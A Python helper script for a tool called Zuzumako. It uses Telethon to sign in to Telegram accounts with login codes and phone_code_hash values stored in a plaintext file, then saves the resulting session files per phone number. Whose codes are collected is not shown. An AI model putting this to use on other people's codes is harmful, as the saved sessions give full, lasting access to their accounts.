#!/usr/bin/env python3
"""
zuzumako / auth.py
───────────────────
Completes Telethon sign_in using OTP + phone_code_hash stored by Zuzumako.

Usage:
  python auth.py --phone +91XXXXXXXXXX
"""

import argparse, json, sys, os, time, asyncio, shutil
from pathlib import Path
from dotenv import load_dotenv

BASE     = Path(__file__).parent
load_dotenv(BASE / "config" / ".env")

API_ID   = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
OTP_FILE = BASE / "otp_store.txt"
TEMP_DIR = BASE / "_temp"
SESSIONS = BASE / "sessions"
SESSIONS.mkdir(exist_ok=True)

async def do_auth(phone, otp, phone_code_hash):
    from telethon import TelegramClient
    from telethon.errors import SessionPasswordNeededError

    safe          = phone.replace("+", "").replace(" ", "")
    temp_session  = str(TEMP_DIR / safe)
    final_session = str(SESSIONS / safe)

    client = TelegramClient(temp_session, API_ID, API_HASH)
    await client.connect()

    try:
        await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        pw = input("[auth] 2FA password: ")
        await client.sign_in(password=pw)

    me = await client.get_me()
    print(f"[auth] ✓  Signed in as {me.first_name} (@{me.username})")
    await client.disconnect()

    # Move to sessions/
    for ext in [".session", ".session-journal"]:
        src = Path(temp_session + ext)
        dst = Path(final_session + ext)
        if src.exists():
            shutil.copy2(src, dst)

    print(f"[auth] Session saved → {final_session}.session")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--phone", required=True)
    args  = parser.parse_args()
    phone = args.phone.strip()

    if not OTP_FILE.exists():
        sys.exit("✗  otp_store.txt not found. Run Zuzumako first.")
    try:
        entries = json.loads(OTP_FILE.read_text())
    except Exception:
        sys.exit("✗  otp_store.txt is corrupt.")

    entry = next((e for e in entries if e.get("phone") == phone), None)
    if not entry:
        sys.exit(f"✗  No OTP entry for {phone}.")
    if entry.get("expired") or time.time() > entry["expires_at"]:
        sys.exit("✗  OTP expired. Request a new one in Zuzumako.")

    otp             = entry["otp"]
    phone_code_hash = entry.get("phone_code_hash")

    if not phone_code_hash:
        sys.exit("✗  phone_code_hash missing. Re-enter phone number in Zuzumako to get a fresh code.")

    print(f"[auth] Signing in as {phone}…")
    asyncio.run(do_auth(phone, otp, phone_code_hash))

    entry["expired"] = True
    OTP_FILE.write_text(json.dumps(entries, indent=2))

if __name__ == "__main__":
    main()
